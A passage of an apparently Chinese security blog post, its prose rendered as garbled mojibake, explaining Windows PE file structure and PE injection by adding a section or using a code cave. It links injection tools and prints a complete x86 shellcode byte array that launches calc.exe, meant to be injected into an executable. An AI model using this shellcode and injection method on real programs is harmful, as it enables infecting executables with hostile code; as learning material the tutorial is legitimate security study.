<p>Êü•ÁúãÁõÆÊ†áÊùÉÈôêÁöÑ‰∏ä‰∏ãÊñáÔºåÂ≠òÂÇ®Âà∞luid‰∏≠„ÄÇ</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/f7e7c258d9847390.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>Áî®Êñ∞Âª∫ÁöÑtpÂØπË±°ÊõøÊç¢ÂéüÊù•ÁöÑËøõÁ®ã‰ª§ÁâåÂÆûÁé∞ÊùÉÈôêÁöÑÂèòÂåñ„ÄÇ</p>
<h2 id="0x05-PEÊ≥®ÂÖ•"><a class="header-anchor" href="#0x05-PEÊ≥®ÂÖ•">¬∂</a>0x05 PEÊ≥®ÂÖ•</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/freeking101/article/details/102752048">https://blog.csdn.net/freeking101/article/details/102752048</a></p>
<p>ËØ•ÊñáÁ´†ÂØπPEÁªìÊûÑËÆ≤Ëß£ÂçÅÂàÜËØ¶ÁªÜ„ÄÇ</p>
<p>PEÔºà Portable ExecuteÔºâÊñá‰ª∂ÊòØWindows‰∏ãÂèØÊâßË°åÊñá‰ª∂ÁöÑÊÄªÁß∞ÔºåÂ∏∏ËßÅÁöÑÊúâ <strong>DLLÔºåEXEÔºåOCXÔºåSYS</strong> Á≠â„ÄÇÂÆÉÊòØÂæÆËΩØÂú® UNIX Âπ≥Âè∞ÁöÑ COFFÔºàÈÄöÁî®ÂØπË±°Êñá‰ª∂Ê†ºÂºèÔºâÂü∫Á°Ä‰∏äÂà∂‰ΩúËÄåÊàê„ÄÇ<strong>ÊúÄÂàùËÆæËÆ°Áî®Êù•ÊèêÈ´òÁ®ãÂ∫èÂú®‰∏çÂêåÊìç‰ΩúÁ≥ªÁªü‰∏äÁöÑÁßªÊ§çÊÄßÔºå‰ΩÜÂÆûÈôÖ‰∏äËøôÁßçÊñá‰ª∂Ê†ºÂºè‰ªÖÁî®Âú® Windows Á≥ªÂàóÊìç‰ΩúÁ≥ªÁªü‰∏ã</strong>„ÄÇ<strong>PEÊñá‰ª∂ÊòØÊåá 32 ‰ΩçÂèØÊâßË°åÊñá‰ª∂Ôºå‰πüÁß∞‰∏∫PE32„ÄÇ64‰ΩçÁöÑÂèØÊâßË°åÊñá‰ª∂Áß∞‰∏∫ PE+ Êàñ PE32+ÔºåÊòØPE(PE32)ÁöÑ‰∏ÄÁßçÊâ©Â±ïÂΩ¢ÂºèÔºàËØ∑Ê≥®ÊÑè‰∏çÊòØPE64)</strong>„ÄÇ</p>
<p>PEÊñá‰ª∂ÁöÑÊ†ºÂºèÂ¶Ç‰∏ã</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/3e5c77288fe4c891.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>PEÊñá‰ª∂Âä†ËΩΩÁöÑËøáÁ®ãÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>Ê£ÄÊü•Dos headerÈáåÈù¢ÁöÑPE headerÂÅèÁßªÔºåÁÑ∂ÂêéÁõ¥Êé•Ë∑≥ËΩ¨Âà∞header</li>
<li>Ê£ÄÊü•headerÊòØÂê¶ÂêàÊ≥ïÔºåÂ¶ÇÊûúÂêàÊ≥ïÂàôË∑≥ËΩ¨Âà∞headerÁöÑÂ∞æÈÉ®</li>
<li>headerÁöÑÂ∞æÈÉ®ÊòØËäÇË°®ÔºåÊ≠§Êó∂PEË£ÖËΩΩÂô®‰ºöËØªÂèñËäÇË°®ÁöÑ‰ø°ÊÅØÔºåÁÑ∂ÂêéÊò†Â∞ÑÂÜÖÂ≠òÔºàËôöÂ≠òÁõ∏ÂÖ≥ÔºåÊìç‰ΩúÁ≥ªÁªüËÆ≤ËøáÔºâ</li>
<li>Êò†Â∞ÑÂÆåÊØï‰πãÂêéÔºåÂºÄÂßãÂ§ÑÁêÜËæìÂÖ•Ë°®ÁöÑÈÄªËæëÈÉ®ÂàÜ</li>
</ul>
<p>Ê≥®ÊÑèÂà∞Êñá‰ª∂‰∏≠ÁöÑËäÇË°®ÂíåËäÇ</p>
<p><strong>ËäÇË°®</strong>ÔºöÊòØ PE Êñá‰ª∂ÂêéÁª≠ËäÇÁöÑÊèèËø∞Ôºåwindows Ê†πÊçÆËäÇË°®ÁöÑÊèèËø∞Âä†ËΩΩÊØè‰∏™ËäÇ„ÄÇ</p>
<p><strong>ËäÇ</strong>ÔºöÊØè‰∏™ËäÇÂÆûÈôÖ‰∏äÊòØ‰∏Ä‰∏™ÂÆπÂô®ÔºåÂèØ‰ª•ÂåÖÂê´ ‰ª£Á†Å„ÄÅÊï∞ÊçÆ Á≠âÁ≠âÔºåÊØè‰∏™ËäÇÂèØ‰ª•ÊúâÁã¨Á´ãÁöÑÂÜÖÂ≠òÊùÉÈôêÔºåÊØîÂ¶Ç‰ª£Á†ÅËäÇÈªòËÆ§ÊúâËØª/ÊâßË°åÊùÉÈôêÔºåËäÇÁöÑÂêçÂ≠óÂíåÊï∞ÈáèÂèØ‰ª•Ëá™Â∑±ÂÆö‰πâÔºåÊú™ÂøÖÊòØ‰∏äÂõæ‰∏≠ÁöÑ‰∏â‰∏™</p>
<p>**ÂØºÂá∫Ë°® <strong>ÊòØ Áî®Êù•ÊèèËø∞ Ê®°ÂùóÔºàdllÔºâ‰∏≠ÁöÑÂØºÂá∫ÂáΩÊï∞ÁöÑÁªìÊûÑÔºåÂ¶ÇÊûú‰∏Ä‰∏™Ê®°ÂùóÂØºÂá∫‰∫ÜÂáΩÊï∞ÔºåÈÇ£‰πàËøô‰∏™ÂáΩÊï∞‰ºöË¢´ËÆ∞ÂΩïÂú®ÂØºÂá∫Ë°®‰∏≠ÔºåËøôÊ†∑ÈÄöËøáGetProcAddressÂáΩÊï∞Â∞±ËÉΩÂä®ÊÄÅËé∑ÂèñÂà∞ÂáΩÊï∞ÁöÑÂú∞ÂùÄ„ÄÇ</strong></p>
<p><strong>ÂØºÂÖ•Ë°®</strong> Âú® PE Êñá‰ª∂Âä†ËΩΩÊó∂Ôºå‰ºöÊ†πÊçÆËøô‰∏™Ë°®ÈáåÁöÑÂÜÖÂÆπÂä†ËΩΩ‰æùËµñÁöÑ DLL ( Ê®°Âùó )ÔºåÂπ∂Â°´ÂÖÖÊâÄÈúÄÂáΩÊï∞ÁöÑÂú∞ÂùÄ„ÄÇ</p>
<h3 id="Ê≥®ÂÖ•ÊÄùË∑Ø"><a class="header-anchor" href="#Ê≥®ÂÖ•ÊÄùË∑Ø">¬∂</a>Ê≥®ÂÖ•ÊÄùË∑Ø</h3>
<p>È¶ñÂÖà‰∫ÜËß£ÔºåPEÊñá‰ª∂‰∏≠ÂØºÂÖ•ÁöÑdll‰ø°ÊÅØ‰ª•ÁªìÊûÑ‰ΩìÁöÑÂΩ¢ÂºèÂ≠òÂÇ®Âú®IDT‰∏≠„ÄÇÂè™Ë¶ÅÂ∞ÜdllÊ∑ªÂä†Âà∞ÂàóË°®Â∞æÈÉ®Â∞±ÂèØ‰ª•„ÄÇ<strong>IMAGE_OPPTIONAL_HEADERÁªìÊûÑ‰Ωì‰∏≠ÂØºÂÖ•Ë°®RVAÂç≥ÊòØIDTÁöÑRVA„ÄÇÂ¶ÇÊûúÂÜÖÂ≠ò‰∏çÂ§üÔºåÂ∞±ÁßªÂä®IDT„ÄÇ</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38204481/article/details/82973582">https://blog.csdn.net/qq_38204481/article/details/82973582</a> IDTÁªìÊûÑËß£Êûê</p>
<p>Ê≥®ÂÖ•ÁöÑÊâãÊÆµ‰∏ÄÂçäÊúâ‰∏§ÁßçÔºö</p>
<ul>
<li>ÂØªÊâæÊúÄÂ§ßÁöÑ‰ª£Á†ÅÁ©∫ÁôΩÔºåcave mineÔºåÂ∞Ü shellcode ÂÜôÂÖ• cave ‰∏≠„ÄÇËøôÁßçÊñπÂºèÊØîËæÉÊñπ‰æøÔºåÁº∫ÁÇπÊòØÂè™ÈÄÇÂêàËæÉÂ∞èÁöÑ  shellcodeÔºåwindows ‰∏äÁöÑ shellcode Ë¶ÅÊØî linux ‰∏äÁöÑ shellcode Â§ßËÆ∏Â§öÔºåËøôÁßçÊñπÂºèÁöÑÊ≥õÁî®ÊÄß‰∏çÈ´ò„ÄÇ</li>
<li>Êñ∞Â¢û PE ËäÇÔºåËøôÁßçÊñπÂºè‰øÆÊîπ PE Êñá‰ª∂ÁöÑËäÇÂ§¥Ë°®ÂíåËäÇÔºåÂèØ‰ª•ÊèíÂÖ•‰ªªÊÑèÂ§ßÂ∞èÁöÑ shellcode„ÄÇ</li>
</ul>
<p>PE Êñá‰ª∂Ê≥®ÂÖ•‰∏ªË¶ÅÂåÖÊã¨‰∏§‰∏™ÊñπÈù¢Ôºö</p>
<ul>
<li>ÁºñÂÜô shellcode</li>
<li>Ê≥®ÂÖ• shellcode</li>
</ul>
<p>Ê≥®ÂÖ• shellcode Áõ∏ÂØπÊØîËæÉÁÆÄÂçïÔºå‰∏ãÈù¢‰ªãÁªçÊñ∞Â¢û PE ËäÇÂÆûÁé∞ PE Ê≥®ÂÖ•ÁöÑÊñπÊ≥ï„ÄÇ</p>
<h3 id="Ê≥®ÂÖ•ÂÆûÁé∞"><a class="header-anchor" href="#Ê≥®ÂÖ•ÂÆûÁé∞">¬∂</a>Ê≥®ÂÖ•ÂÆûÁé∞</h3>
<p>ÊÄùË∑ØÂ§ßÈÉΩÊòØÊ∑ªÂä†ËäÇ‰πãÁ±ªÁöÑÔºåËøôÈáåËá™Â∑±Ê≤°ÊúâÂÆûÁé∞ÔºåÊâæ‰∫Ü‰∏§‰∏™È°πÁõÆ„ÄÇ</p>
<p><a target="_blank" rel="noopener" href="https://github.com/secrary/InfectPE">https://github.com/secrary/InfectPE</a> Ëøô‰∏™ÊòØÊ≥®ÂÖ•peÁöÑÈ°πÁõÆ</p>
<p><a target="_blank" rel="noopener" href="https://github.com/hasherezade/pe_to_shellcode/releases">https://github.com/hasherezade/pe_to_shellcode/releases</a> Ëøô‰∏™ÂæàÂº∫ÔºåËΩ¨Âåñpe‰∏∫shellcode</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1597699">https://cloud.tencent.com/developer/article/1597699</a> ËøôÊòØpe_to_shellcodeÁöÑËß£Êûê</p>
<p>pe_to_shellcodeËøô‰∏™‰∏úË•øÂæóÁúã‰ª£Á†ÅÊâçËÉΩÊáÇ„ÄÇ</p>
<p>ÊºîÁ§∫‰∏Ä‰∏ãÁ¨¨‰∏Ä‰∏™Ê≥®ÂÖ•È°πÁõÆ„ÄÇ</p>
<p>ÊâãÂä®ÁºñËØë‰∫Ü‰∏Ä‰∏™32‰ΩçÁöÑÈ°πÁõÆ</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/29/26b87b3f5a5c4140.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ÁÑ∂ÂêéÂà©Áî®githubÈ°πÁõÆ‰∏≠ÁöÑexeÔºåÊâßË°åÊ≥®ÂÖ•ÔºåÊ≥®ÂÖ•ÁöÑ‰ª£Á†ÅÊòØÂºπÂá∫‰∏Ä‰∏™messagebox</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/29/0e334c33e4615565.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ËøêË°åbadpe</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/29/aee43335a77654f6.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ÁÇπÂáªÁ°ÆÂÆö‰πãÂêé‰ºöÊîøÁ≠ñÊâßË°å‰ª£Á†Å„ÄÇÂºπËÆ°ÁÆóÂô®Âè™ÈúÄË¶ÅÊääÊîπ‰ª£Á†ÅÊõøÊç¢‰∏∫‰∏ãÈù¢ÁöÑshellcodeÂç≥ÂèØ„ÄÇ</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> sc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> 
<span class="token string">"\x50\x53\x51\x52\x56\x57\x55\x89"</span>
<span class="token string">"\xe5\x83\xec\x18\x31\xf6\x56\x6a"</span>
<span class="token string">"\x63\x66\x68\x78\x65\x68\x57\x69"</span>
<span class="token string">"\x6e\x45\x89\x65\xfc\x31\xf6\x64"</span>
<span class="token string">"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"</span>
<span class="token string">"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"</span>
<span class="token string">"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"</span>
<span class="token string">"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"</span>
<span class="token string">"\x48\x24\x01\xd9\x89\x4d\xf4\x8b"</span>
<span class="token string">"\x78\x20\x01\xdf\x89\x7d\xf0\x8b"</span>
<span class="token string">"\x50\x1c\x01\xda\x89\x55\xec\x8b"</span>
<span class="token string">"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"</span>
<span class="token string">"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"</span>
<span class="token string">"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"</span>
<span class="token string">"\x08\xf3\xa6\x74\x0a\x40\x39\xd8"</span>
<span class="token string">"\x72\xe5\x83\xc4\x26\xeb\x41\x8b"</span>
<span class="token string">"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"</span>
<span class="token string">"\x8b\x04\x41\x8b\x04\x82\x01\xd8"</span>
<span class="token string">"\x31\xd2\x52\x68\x2e\x65\x78\x65"</span>
<span class="token string">"\x68\x63\x61\x6c\x63\x68\x6d\x33"</span>
<span class="token string">"\x32\x5c\x68\x79\x73\x74\x65\x68"</span>
<span class="token string">"\x77\x73\x5c\x53\x68\x69\x6e\x64"</span>
<span class="token string">"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"</span>
<span class="token string">"\x6a\x0a\x56\xff\xd0\x83\xc4\x46"</span>
<span class="token string">"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/others/" class="category-chain-item">others</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/windows%E6%8F%90%E6%9D%83/">#windowsÊèêÊùÉ</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>‰ªéËøõÁ®ãÊ≥®ÂÖ•Âà∞ÊèêÊùÉ</div>
      <div>http://example.com/2022/06/26/ËøõÁ®ãÊ≥®ÂÖ•ËØ¶Ëß£/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>‰ΩúËÄÖ</div>
          <div>Epiphany</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>ÂèëÂ∏É‰∫é</div>
          <div>2022Âπ¥6Êúà26Êó•</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>ËÆ∏ÂèØÂçèËÆÆ</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ÁΩ≤Âêç">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/06/29/CVE-2021-0277%E4%BB%8E%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%88%B0poc%E7%BC%96%E5%86%99/" title="CVE-2021-0277‰ªéÊºèÊ¥ûÊä•ÂëäÂà∞pocÁºñÂÜô">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CVE-2021-0277‰ªéÊºèÊ¥ûÊä•ÂëäÂà∞pocÁºñÂÜô</span>
                        <span class="visible-mobile">‰∏ä‰∏ÄÁØá</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/06/25/%E5%A5%BD%E6%80%80%E7%99%BE%E5%B2%81%E5%87%A0%E5%9B%9E%E5%BC%80/" title="Â•ΩÊÄÄÁôæÂ≤ÅÂá†ÂõûÂºÄ">
                        <span class="hidden-mobile">Â•ΩÊÄÄÁôæÂ≤ÅÂá†ÂõûÂºÄ</span>
                        <span class="visible-mobile">‰∏ã‰∏ÄÁØá</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"QC4vvYPEM2BYGMlNkxfbdllW-gzGzoHsz","appKey":"nsnNub648pvsc3yts6pFQY1A","path":"window.location.pathname","placeholder":"ÁïôË®ÄÂè≠","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://qc4vvype.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ÁõÆÂΩï</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">ÊêúÁ¥¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">ÂÖ≥ÈîÆËØç</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="website-duration">ËΩΩÂÖ•ÁΩëÁ´ôËøêË°åÊó∂Èó¥...</span> <script src="/js/duration.js"></script> </div>   
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        ÊÄªËÆøÈóÆÈáè 
        <span id="leancloud-site-pv"></span>
         Ê¨°
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        ÊÄªËÆøÂÆ¢Êï∞ 
        <span id="leancloud-site-uv"></span>
         ‰∫∫
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script  src="https://lib.baomitu.com/prism/1.27.0/plugins/line-numbers/prism-line-numbers.min.js" ></script>

  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="/js/leancloud.js" ></script>





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°πÔºåÂ∞ÜÂÆÉ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">ÂçöÂÆ¢Âú®ÂÖÅËÆ∏ JavaScript ËøêË°åÁöÑÁéØÂ¢É‰∏ãÊµèËßàÊïàÊûúÊõ¥‰Ω≥</div>
  </noscript>
</body>
</html>
